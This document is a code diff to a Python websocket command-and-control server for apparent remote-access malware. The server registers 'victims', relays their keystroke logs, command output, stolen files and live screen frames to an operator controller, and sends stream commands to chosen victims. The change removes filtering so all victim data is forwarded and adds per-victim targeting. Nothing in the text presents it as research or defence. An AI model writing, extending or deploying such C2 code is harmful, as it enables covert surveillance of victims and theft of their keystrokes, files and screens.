@@ -9,7 +9,6 @@ rdid = None
 controller = None
 background_controller = None
 
-
 async def handler(websocket):
     global controller, rdid, background_controller
     try:
@@ -20,20 +19,17 @@ async def handler(websocket):
 
     # Handle BACKGROUND CONTROLLER
     if first_msg.find("ROLE:BACKGROUND") != -1:
-        global background_controller
         background_controller = websocket
         try:
             for vid in victims.keys():
                 await background_controller.send(f"EXISTING_VICTIM:{vid}")
-            # Keep the connection alive until closed
             await websocket.wait_closed()
         except Exception as e:
             print(f"Background controller error: {e}")
         finally:
-            # Only clear if this is still the active background controller
             if background_controller == websocket:
                 background_controller = None
-        return  # Important: don't fall through!
+        return
 
     # Handle VICTIM
     elif first_msg.find(":VICTIM-777777") != -1:
@@ -57,9 +53,10 @@ async def handler(websocket):
 
         try:
             async for message in websocket:
-                print(message)
+                print(f"Victim {victim_id} msg: {message}")
 
                 if isinstance(message, bytes):
+                    # Forward ALL binary data (frames, files) to the controller
                     if controller and not controller.closed:
                         try:
                             await controller.send(message)
@@ -67,18 +64,16 @@ async def handler(websocket):
                             controller = None
 
                 elif isinstance(message, str):
-                    if message.startswith((
-                        "KEYLOG:", "OUTPUT:", "ERROR:", "PONG:",
-                        "READY_FOR_FILE", "BINARY_START_", "BINARY_END",
-                        "EXEC_FILE:", "BINARY_END_FILE", "LIVE_STREAM_FRAME"
-                    )):
-                        if controller and not controller.closed:
-                            try:
-                                await controller.send(message)
-                            except websockets.ConnectionClosed:
-                                controller = None
+                    # Forward ALL string messages to the controller. 
+                    # The controller's handleControllerMessage already strips the "ID:" prefix.
+                    if controller and not controller.closed:
+                        try:
+                            await controller.send(message)
+                        except websockets.ConnectionClosed:
+                            controller = None
 
-                    if message == "READY_FOR_FILE":
+                    # Update rdid so the server knows which victim is expecting a file
+                    if "READY_FOR_FILE" in message:
                         rdid = victim_id
 
         except Exception as e:
@@ -107,20 +102,30 @@ async def handler(websocket):
             for vid in victims.keys():
                 await controller.send(f"EXISTING_VICTIM:{vid}")
             async for message in websocket:
-                print(message)
+                print(f"Controller msg: {message}")
 
-                if message == "START_LIVE_STREAM" or message == "STOP_LIVE_STREAM":
-                    if victims:
-                        victim_ws = next(iter(victims.values()))
-                        if not victim_ws.closed:
+                # Handle live stream commands (now supports "ID:START_LIVE_STREAM")
+                if "START_LIVE_STREAM" in message or "STOP_LIVE_STREAM" in message:
+                    if ":" in message:
+                        parts = message.split(":", 1)
+                        target_id = parts[0]
+                        cmd = parts[1]
+                        if target_id in victims:
                             try:
-                                await victim_ws.send(message)
+                                await victims[target_id].send(cmd)
                             except websockets.ConnectionClosed:
-                                # Victim gone? Remove it.
-                                lost_id = [k for k, v in victims.items() if v == victim_ws]
-                                if lost_id:
-                                    del victims[lost_id[0]]
-                                    rdid = None
+                                del victims[target_id]
+                    else:
+                        # Fallback: if no ID is provided, send to the first available victim
+                        if victims:
+                            victim_ws = next(iter(victims.values()))
+                            if not victim_ws.closed:
+                                try:
+                                    await victim_ws.send(message)
+                                except websockets.ConnectionClosed:
+                                    lost_id = [k for k, v in victims.items() if v == victim_ws]
+                                    if lost_id:
+                                        del victims[lost_id[0]]
 
                 elif isinstance(message, str) and ":" in message:
                     parts = message.split(":", 2)
